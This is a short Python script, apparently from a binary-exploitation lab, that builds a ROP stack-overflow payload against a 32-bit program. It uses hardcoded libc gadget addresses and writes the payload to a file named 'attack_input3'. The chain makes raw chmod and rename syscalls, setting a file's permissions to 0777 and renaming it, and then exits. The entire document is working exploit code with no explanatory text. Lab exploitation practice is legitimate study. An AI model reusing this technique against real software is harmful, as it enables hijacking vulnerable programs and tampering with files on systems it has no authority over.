from struct import *
# buf to ret_addr
offset = 0x38

base_libcaddr = 0xb7e23000
buf_addr = 0xbffff6c4
fileName_string_offset = 424

push_eax_addr = 0x001288e6
pop_eax_addr = 0x0002470f
pop_ebx_addr = 0x0007c789
pop_ecx_addr = 0x000e1c03
shr_eax_addr = 0x0010ac1e
xor_eax_addr = 0x0006679f
inc_eax_addr = 0x00015fa4
xchg_ecx_eax = 0x00063e62
# Padding goes here

p = 'IIII'
p += (offset-4) * 'A'

p += pack('<I', pop_ebx_addr + base_libcaddr) # pop ebx ; ret
p += pack('<I', 0x804887d)    # data addr

p += pack('<I', pop_eax_addr + base_libcaddr) # pop eax ; ret
p += pack('<I', 0xffffffff) # eax = 0xffffffff
for i in range(23):
	p += pack('<I', shr_eax_addr + base_libcaddr) # shr eax, 1 ; ret
p += pack('<I', xchg_ecx_eax + base_libcaddr) # xchg ecx, eax ; ret

p += pack('<I', xor_eax_addr + base_libcaddr) # xor eax, eax ; ret
print(xor_eax_addr + base_libcaddr)
for i in range(15):
	p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret

# side effect
p += pack('<I', 0x0804861a) # int 0x80 ; xor eax,eax ; ret

p += pack('<I', pop_ebx_addr + base_libcaddr) # pop ebx ; ret
p += pack('<I', 0x804887d)    # data addr

p += pack('<I', pop_ecx_addr + base_libcaddr) # pop ecx ; ret
p += pack('<I', buf_addr + fileName_string_offset)    # data addr

p += pack('<I', xor_eax_addr + base_libcaddr) # xor eax, eax ; ret
for i in range(38):
        p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret

# side effect
p += pack('<I', 0x0804861a) # int 0x80 ; xor eax,eax ; ret

# exit()
p += pack('<I', xor_eax_addr + base_libcaddr) # xor eax, eax ; ret
#p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', 0xb7e56260)
p += pack('<I', 0x0804861c) # int 0x80 ; xor eax,eax ; ret


# file name string
print(len(p))
p += '20231120\0'
file = open('attack_input3', 'wb')
file.write("3\n")
file.write(p)
file.close()
